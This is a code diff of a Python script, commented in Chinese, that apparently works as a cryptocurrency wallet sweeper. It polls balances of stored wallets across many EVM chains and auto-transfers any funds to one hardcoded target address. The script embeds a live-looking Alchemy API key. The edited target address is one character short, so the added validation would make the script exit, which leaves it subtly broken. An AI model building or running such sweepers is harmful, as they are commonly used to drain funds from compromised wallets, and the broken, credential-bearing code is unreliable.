@@ -85,13 +85,36 @@ except ImportError as e:
 
 # 配置
 ALCHEMY_API_KEY = "MYr2ZG1P7bxc4F1qVTLIj"
-TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf"
+
+def validate_ethereum_address(address: str) -> bool:
+    """验证以太坊地址格式"""
+    try:
+        # 检查是否以0x开头并且长度为42个字符
+        if not address.startswith('0x') or len(address) != 42:
+            return False
+        
+        # 检查是否都是有效的十六进制字符
+        int(address[2:], 16)
+        
+        # 使用Web3的内置验证
+        from web3 import Web3
+        return Web3.is_address(address)
+    except:
+        return False
+
+# 验证目标地址
+if not validate_ethereum_address(TARGET_ADDRESS):
+    print(f"❌ 错误: TARGET_ADDRESS 格式无效: {TARGET_ADDRESS}")
+    print(f"💡 正确格式应该是: 0x + 40个十六进制字符")
+    sys.exit(1)
 
 # 数据文件
 WALLETS_FILE = "wallets.json"
 MONITORING_LOG_FILE = "monitoring_log.json"
 CONFIG_FILE = "config.json"
 NETWORK_STATUS_FILE = "network_status.json"
+SCAN_STATUS_FILE = "scan_status.json"
 
 # 完整的EVM/L2链条配置（纯RPC模式）
 ALCHEMY_NETWORK_CONFIG = {
@@ -647,8 +670,10 @@ class WalletMonitor:
         self.web3_clients: Dict[str, Web3] = {}        # RPC模式客户端
         self.monitoring_active = False
         self.network_status: Dict[str, NetworkStatus] = {}
+        self.scan_status: Dict[str, Dict[str, Any]] = {}
         self.load_wallets()
         self.load_network_status()
+        self.load_scan_status()
         
         # 注册清理函数
         import atexit
@@ -662,6 +687,7 @@ class WalletMonitor:
             
             # 保存网络状态
             self.save_network_status()
+            self.save_scan_status()
             
             # 清理Web3客户端
             self.web3_clients.clear()
@@ -844,6 +870,17 @@ class WalletMonitor:
                     }
             except:
                 self.network_status = {}
+
+    def load_scan_status(self):
+        """加载初次扫描状态"""
+        if os.path.exists(SCAN_STATUS_FILE):
+            try:
+                with open(SCAN_STATUS_FILE, 'r', encoding='utf-8') as f:
+                    self.scan_status = json.load(f)
+            except:
+                self.scan_status = {}
+        else:
+            self.scan_status = {}
     
     def save_network_status(self):
         """保存网络状态"""
@@ -851,6 +888,14 @@ class WalletMonitor:
             data = {k: v.__dict__ for k, v in self.network_status.items()}
             with open(NETWORK_STATUS_FILE, 'w', encoding='utf-8') as f:
                 json.dump(data, f, ensure_ascii=False, indent=2)
+        except:
+            pass
+
+    def save_scan_status(self):
+        """保存初次扫描状态"""
+        try:
+            with open(SCAN_STATUS_FILE, 'w', encoding='utf-8') as f:
+                json.dump(self.scan_status, f, ensure_ascii=False, indent=2)
         except:
             pass
     
@@ -1151,6 +1196,35 @@ class WalletMonitor:
             
         except Exception as e:
             return False
+
+    async def scan_wallet_activity_once(self, wallet: WalletInfo) -> Dict[str, Any]:
+        """扫描一个钱包在所有可用网络上的链上活动（一次性）"""
+        result = {
+            'address': wallet.address,
+            'networks_with_activity': [],
+            'scanned_at': datetime.now().isoformat()
+        }
+
+        # 获取可用网络并按优先级排序
+        available_networks = [
+            net for net in wallet.enabled_networks 
+            if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
+        ]
+        available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
+
+        # 限制并发
+        semaphore = asyncio.Semaphore(2)
+
+        async def check(net: str):
+            async with semaphore:
+                await asyncio.sleep(0.1)
+                has = await self.check_address_activity_optimized(wallet.address, net)
+                if has:
+                    result['networks_with_activity'].append(net)
+
+        tasks = [check(net) for net in available_networks]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        return result
     
     async def get_balance_optimized(self, address: str, network_key: str) -> float:
         """优化的余额获取 - 纯RPC模式"""
@@ -1264,6 +1338,11 @@ class WalletMonitor:
             
             if transfer_amount <= 0:
                 print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
+                return False
+            
+            # 验证目标地址
+            if not validate_ethereum_address(TARGET_ADDRESS):
+                print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 目标地址无效: {TARGET_ADDRESS}{Style.RESET_ALL}")
                 return False
             
             # 构建交易
@@ -1464,24 +1543,84 @@ class WalletMonitor:
         print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
         
         self.monitoring_active = True
-        
-        # 限制并发监控数量，优化性能 - 进一步降低并发
-        semaphore = asyncio.Semaphore(1)  # 改为串行监控，避免API限制
-        
-        async def monitor_with_limit(wallet):
-            async with semaphore:
-                await self.monitor_wallet_optimized(wallet)
-        
-        # 创建监控任务
-        tasks = [monitor_with_limit(wallet) for wallet in self.wallets]
-        
+
+        # Step 1: 初始化连接已在外部完成
+
+        # Step 2: 初次扫描未扫描过的钱包
+        print(f"\n{Fore.CYAN}🔎 初次扫描：检查是否有钱包未扫描过链上交易记录...{Style.RESET_ALL}")
+        unscanned_wallets = [w for w in self.wallets if self.scan_status.get(w.address, {}).get('scanned') is not True]
+        if unscanned_wallets:
+            print(f"{Fore.CYAN}🧾 发现 {len(unscanned_wallets)} 个未扫描的钱包，开始扫描...{Style.RESET_ALL}")
+            for wallet in unscanned_wallets:
+                try:
+                    scan_result = await self.scan_wallet_activity_once(wallet)
+                    self.scan_status[wallet.address] = {
+                        'scanned': True,
+                        'networks_with_activity': scan_result['networks_with_activity'],
+                        'scanned_at': scan_result['scanned_at']
+                    }
+                    self.save_scan_status()
+                except Exception as e:
+                    print(f"{Fore.YELLOW}⚠️ 初次扫描失败: {wallet.address[:10]}... {str(e)[:40]}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.GREEN}✅ 所有钱包都已完成过初次扫描{Style.RESET_ALL}")
+
+        # Step 3: 进入轮询监控循环
+        print(f"\n{Fore.GREEN}▶️ 进入监控循环：逐个钱包检查余额并尝试转账{Style.RESET_ALL}")
+        round_index = 0
         try:
-            await asyncio.gather(*tasks)
+            while self.monitoring_active:
+                round_index += 1
+                print(f"\n{Fore.CYAN}🔄 第 {round_index} 轮扫描开始{Style.RESET_ALL}")
+
+                # 逐个钱包处理，一次尝试后进入下一个
+                for wallet in self.wallets:
+                    short_addr = f"{wallet.address[:10]}...{wallet.address[-8:]}"
+                    print(f"{Fore.CYAN}👛 处理钱包: {short_addr}{Style.RESET_ALL}")
+
+                    # 选择要监控的网络集合：
+                    # 如果初扫发现有活动，则仅在这些网络上查询余额；否则按优先级挑选若干主网查询
+                    networks_with_activity = self.scan_status.get(wallet.address, {}).get('networks_with_activity', [])
+                    if networks_with_activity:
+                        candidate_networks = networks_with_activity
+                    else:
+                        candidate_networks = [
+                            net for net in wallet.enabled_networks
+                            if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
+                        ]
+                        candidate_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
+                        candidate_networks = candidate_networks[:8]  # 限制数量，避免压力
+
+                    transferred = False
+                    for network_key in candidate_networks:
+                        try:
+                            balance = await self.get_balance_optimized(wallet.address, network_key)
+                            if balance > 0:
+                                currency = SUPPORTED_NETWORKS[network_key]['config']['currency']
+                                print(f"{Fore.GREEN}💰 发现余额: {balance:.8f} {currency} | 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
+                                print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
+                                ok = await self.transfer_balance_optimized(wallet, network_key, balance)
+                                if ok:
+                                    print(f"{Fore.GREEN}🎉 自动转账完成{Style.RESET_ALL}")
+                                else:
+                                    print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
+                                transferred = True
+                                break  # 不管成功或失败，进入下一个钱包
+                        except Exception:
+                            continue
+
+                    if not transferred:
+                        print(f"{Fore.YELLOW}🚫 未发现可转余额，跳过{Style.RESET_ALL}")
+
+                # 智能间隔：根据上一轮的情况设定，这里简单固定为60s，可扩展为动态
+                print(f"{Fore.CYAN}⏱ 下一轮开始前等待 60 秒...{Style.RESET_ALL}")
+                await asyncio.sleep(60)
         except KeyboardInterrupt:
             print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
         finally:
             self.monitoring_active = False
-            self.save_network_status()  # 保存网络状态
+            self.save_network_status()
+            self.save_scan_status()
     
     def start_monitoring_menu(self):
         """开始监控菜单 - 完全优化交互"""
